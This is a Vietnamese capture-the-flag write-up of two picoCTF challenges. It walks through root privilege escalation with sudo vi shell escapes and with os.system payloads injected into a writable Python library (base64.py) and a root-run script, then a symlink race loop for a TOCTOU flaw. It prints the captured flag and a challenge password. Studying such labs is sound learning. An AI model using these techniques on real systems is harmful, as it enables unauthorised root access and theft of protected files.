
- [hijacking](#hijacking )
- [toctou](#toctou)

## hijacking 
ssh **username**@**hostname** -p **port**

```shell
picoctf@challenge:~$ sudo -l
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py

```

```shell
picoctf@challenge:~$ ls -la
total 16
drwxr-xr-x 1 picoctf picoctf   20 Aug  5 08:24 .
drwxr-xr-x 1 root    root      21 Aug  4 21:10 ..
-rw-r--r-- 1 picoctf picoctf  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoctf picoctf 3771 Feb 25  2020 .bashrc
drwx------ 2 picoctf picoctf   34 Aug  5 08:24 .cache
-rw-r--r-- 1 picoctf picoctf  807 Feb 25  2020 .profile
-rw-r--r-- 1 root    root     375 Mar 16 01:30 .server.py

```

Chúng ta cần tìm nơi có khả năng đang chứa flag.

```shell
picoctf@challenge:~$ cd /
picoctf@challenge:/$ ls -la
total 0
drwxr-xr-x    1 root   root     51 Aug  5 09:05 .
drwxr-xr-x    1 root   root     51 Aug  5 09:05 ..
-rwxr-xr-x    1 root   root      0 Aug  5 09:05 .dockerenv
lrwxrwxrwx    1 root   root      7 Mar  8 02:05 bin -> usr/bin
drwxr-xr-x    2 root   root      6 Apr 15  2020 boot
d---------    1 root   root      6 Aug  4 21:11 challenge
drwxr-xr-x    5 root   root    340 Aug  5 09:05 dev
drwxr-xr-x    1 root   root     66 Aug  5 09:05 etc
drwxr-xr-x    1 root   root     21 Aug  4 21:10 home
lrwxrwxrwx    1 root   root      7 Mar  8 02:05 lib -> usr/lib
lrwxrwxrwx    1 root   root      9 Mar  8 02:05 lib32 -> usr/lib32
lrwxrwxrwx    1 root   root      9 Mar  8 02:05 lib64 -> usr/lib64
lrwxrwxrwx    1 root   root     10 Mar  8 02:05 libx32 -> usr/libx32
drwxr-xr-x    2 root   root      6 Mar  8 02:06 media
drwxr-xr-x    2 root   root      6 Mar  8 02:06 mnt
drwxr-xr-x    2 root   root      6 Mar  8 02:06 opt
dr-xr-xr-x 2145 nobody nogroup   0 Aug  5 09:05 proc
drwx------    1 root   root     23 Aug  4 21:11 root
drwxr-xr-x    1 root   root     54 Aug  5 09:06 run
lrwxrwxrwx    1 root   root      8 Mar  8 02:05 sbin -> usr/sbin
drwxr-xr-x    2 root   root      6 Mar  8 02:06 srv
dr-xr-xr-x   13 nobody nogroup   0 Aug  5 09:05 sys
drwxrwxrwt    1 root   root      6 Aug  4 21:11 tmp
drwxr-xr-x    1 root   root     18 Mar  8 02:06 usr
drwxr-xr-x    1 root   root     17 Mar  8 02:09 var
picoctf@challenge:/$ cd challenge/
-bash: cd: challenge/: Permission denied
```

trông challenge khá là khả nghi


Chúng ta sẽ có tới 3 cách solve chall này:

1. Thực hiện việc lợi dụng vi để leo thang đặc quyền
2. Chỉnh sửa file thư viện, để khi thực thi .server.py => thực thi nốt 
3. Chỉnh sửa ngay luôn file .server.py

## Thực hiện việc lợi dụng vi để leo thang đặc quyền

[for more](https://gtfobins.github.io/gtfobins/vi/)

```shell
picoctf@challenge:~$ sudo /usr/bin/vi

metadata.json

Press ENTER or type command to continue
cat: metadata.json: No such file or directory

shell returned 1

Press ENTER or type command to continue
{"flag": "picoCTF{pYth0nn_libraryH!j@CK!n9_f56dbed6}", "username": "picoctf", "password": "3aKUWQv068"}
Press ENTER or type command to continue
```

1. **:! ls /challenge/**
2. **:! cat /challenge/metadata.json**

Cụ thể hơn:

```shell
picoctf@challenge:/$ sudo  /usr/bin/vi  -c ':! ls -la /challenge'

total 4
d--------- 1 root root   6 Aug  4 21:11 .
drwxr-xr-x 1 root root  63 Aug  5 09:05 ..
-rw-r--r-- 1 root root 103 Aug  4 21:11 metadata.json

Press ENTER or type command to continue
picoctf@challenge:/$ sudo  /usr/bin/vi  -c ':! cat /challenge/metadata.json'

{"flag": "picoCTF{pYth0nn_libraryH!j@CK!n9_f56dbed6}", "username": "picoctf", "password": "3aKUWQv068"}
Press ENTER or type command to continue
```

## Chỉnh sửa file thư viện, để khi thực thi .server.py => thực thi nốt

```shell
picoctf@challenge:~$ find / -name "base64.py"
find: ‘/etc/ssl/private’: Permission denied
find: ‘/proc/tty/driver’: Permission denied
............
............
find: ‘/root’: Permission denied
find: ‘/run/sudo’: Permission denied
/usr/lib/python3.8/base64.py
find: ‘/var/lib/private’: Permission denied
find: ‘/var/log/private’: Permission denied
find: ‘/challenge’: Permission denied

```

```shell
picoctf@challenge:~$ ls -la /usr/lib/python3.8/base64.py
-rwxrwxrwx 1 root root 20423 Aug  5 08:34 /usr/lib/python3.8/base64.py

```

Bây giờ vào file base64.py và inject :

```python
import os

os.system("ls -la /challenge")
os.system("cat /challenge/metadata.json")

```


```shell
picoctf@challenge:~$ vi  /usr/lib/python3.8/base64.py

picoctf@challenge:~$ sudo /usr/bin/python3  /home/picoctf/.server.py
total 4
d--------- 1 root root   6 Aug  4 21:11 .
drwxr-xr-x 1 root root  63 Aug  5 08:33 ..
-rw-r--r-- 1 root root 103 Aug  4 21:11 metadata.json
{"flag": "picoCTF{pYth0nn_libraryH!j@CK!n9_f56dbed6}", "username": "picoctf", "password": "3aKUWQv068"}sh: 1: ping: not found
Traceback (most recent call last):
  File "/home/picoctf/.server.py", line 9, in <module>
    host_info = socket.gethostbyaddr(ip)
socket.gaierror: [Errno -5] No address associated with hostname

```

### Chỉnh sửa ngay luôn file .server.py

Bây giờ vào file .server.py và inject :

```python
import os

os.system("ls -la /challenge")
os.system("cat /challenge/metadata.json")

```

```shell
picoctf@challenge:~$ sudo /usr/bin/vi  /home/picoctf/.server.py
picoctf@challenge:~$ sudo /usr/bin/python3  /home/picoctf/.server.py
total 4
d--------- 1 root root   6 Aug  4 21:11 .
drwxr-xr-x 1 root root  63 Aug  5 08:33 ..
-rw-r--r-- 1 root root 103 Aug  4 21:11 metadata.json
{"flag": "picoCTF{pYth0nn_libraryH!j@CK!n9_f56dbed6}", "username": "picoctf", "password": "3aKUWQv068"}sh: 1: ping: not found
Traceback (most recent call last):
  File "/home/picoctf/.server.py", line 10, in <module>
    host_info = socket.gethostbyaddr(ip)
socket.gaierror: [Errno -5] No address associated with hostname

```


## toctou

[More detail](https://brandon-t-elliott.github.io/tic-tac)

```python
timeout 30s bash -c 'while true; do ln -sf src.cpp flag; ln -sf flag.txt flag; done' &
while ! ./txtreader flag 2> /dev/null | grep "picoCTF"; do :; done
```